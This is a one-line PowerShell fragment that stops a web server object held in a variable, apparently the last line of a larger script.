$webServer.Stop()
